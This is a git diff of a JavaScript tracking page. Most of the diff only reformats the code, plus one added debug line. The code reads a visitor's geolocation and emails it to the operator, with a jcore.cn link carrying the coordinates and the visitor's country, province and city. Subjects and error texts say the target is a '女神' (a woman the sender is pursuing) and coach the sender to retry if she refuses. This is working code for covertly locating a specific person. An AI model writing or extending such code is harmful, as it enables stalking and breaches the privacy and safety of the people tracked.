@@ -15,6 +15,7 @@
         init : function()
         {
             this.repeat = true;
+            console.log(this.repeat);
             if(this.repeat){ //防止重复点击
                this.gps(function(mail){
                    if(mail.isSuccess){
@@ -32,41 +33,39 @@
             if(navigator.geolocation)
             {
                 var message = "", address="";
-                navigator.geolocation.getCurrentPosition
-                (
-                    function (position)
+                navigator.geolocation.getCurrentPosition(function (position)
+                {
+                    var lon = position.coords.longitude; //经度
+                    var lat = position.coords.latitude; //纬度
+
+                    if(position.address) //是否支持address属性
                     {
-                        var lon = position.coords.longitude; //经度
-                        var lat = position.coords.latitude; //纬度
-                        if(position.address) //是否支持address属性
-                        {
-                            //通过address，可以获得国家、省份、城市
-                            var _a = position.address;
-                            address =  "(" + (_a.country + _a.province + _a.city) + ")";
-                        }
-                        message = ( "lat=" + lat + "&lon=" + lon );
-                        callfun({
-                            isSuccess : true,
-                            subject : "女神地址获取成功，速速查看^0^...",
-                            html : "<a href=\"http://jcore.cn/z.html?\" "+message+" target=\"_blank\" >戳我..."+ address +"</a>"
-                        });
-                    },
-                    function (error)
-                    {
-                        var type =
-                        {
-                            1: '女神拒绝提供地理位置（自己想办法咯）',
-                            2: '获取不到女神位置信息（爱莫能助啊）',
-                            3: '超时（多访问几次，或者过段时间再次尝试）'
-                        }
-                        message = ('获取数据失败：' + type[error.code]);
-                        callfun({
-                            isSuccess : false,
-                            subject : "女神地址获取失败，不哭不哭T_T...",
-                            html : message
-                        });
+                        //通过address，可以获得国家、省份、城市
+                        var _a = position.address;
+                        address =  "(" + (_a.country + _a.province + _a.city) + ")";
                     }
-                );
+                    message = ( "lat=" + lat + "&lon=" + lon );
+                    callfun({
+                        isSuccess : true,
+                        subject : "女神地址获取成功，速速查看^0^...",
+                        html : "<a href=\"http://jcore.cn/z.html?\" "+message+" target=\"_blank\" >戳我..."+ address +"</a>"
+                    });
+                },
+                function (error)
+                {
+                    var type =
+                    {
+                        1: '女神拒绝提供地理位置（自己想办法咯）',
+                        2: '获取不到女神位置信息（爱莫能助啊）',
+                        3: '超时（多访问几次，或者过段时间再次尝试）'
+                    }
+                    message = ('获取数据失败：' + type[error.code]);
+                    callfun({
+                        isSuccess : false,
+                        subject : "女神地址获取失败，不哭不哭T_T...",
+                        html : message
+                    });
+                });
             }
         },
         /** 发送邮件 */
